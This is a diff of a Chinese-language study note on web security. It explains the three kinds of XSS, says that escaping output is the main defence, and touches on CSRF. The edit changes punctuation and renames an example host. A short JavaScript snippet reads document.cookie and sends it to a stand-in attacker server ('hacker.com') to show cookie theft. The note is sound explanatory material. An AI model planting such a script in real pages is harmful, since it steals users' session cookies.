@@ -1,9 +1,9 @@
 # Web 安全
 
 ## XSS
-为了避免跟 CSS 的缩写混淆，Cross-Site Script 的缩写是 XSS。它是通过一些手段在受害者的网页上植入一些 JS 脚本，然后执行后续攻击逻辑 (如: 修改 DOM 将黑客自己的收款码贴上来、获取 Cookie 并发送到黑客的服务器等等)。
+为了避免跟 CSS 的缩写混淆，Cross-Site Script 的缩写是 XSS。它是通过一些手段在受害者的网页上植入一些 JS 脚本，然后执行后续攻击逻辑 (如：修改 DOM 将黑客自己的收款码贴上来、获取 Cookie 并发送到黑客的服务器等等)。
 
-XSS 攻击分为 3 种: 存储型、反射型、DOM 型。前两个是后端的锅，第三个是前端的锅。最主要的防范方法就是前后端都要对那些会被插入到 HTML 中的内容做特殊字符转义。
+XSS 攻击分为 3 种：存储型、反射型、DOM 型。前两个是后端的锅，第三个是前端的锅。最主要的防范方法就是前后端都要对那些会被插入到 HTML 中的内容做特殊字符转义。
 
 其它内容自己看参考资料，我这里没必要重复写一遍。
 
@@ -29,7 +29,7 @@ CSRF 攻击一般需要受害者已经登录过目标站点 (保存过 Cookie)�
 ```javascript
 var cookie = document.cookie;  // 1. 获取 Cookie 信息
 var xhr = new XMLHttpRequest();
-xhr.open('http://heike.com?cookie=' + cookie);  // 2. 将 Cookie 信息发送到黑客服务器
+xhr.open('http://hacker.com?cookie=' + cookie);  // 2. 将 Cookie 信息发送到黑客服务器
 xhr.send();
 ```
 
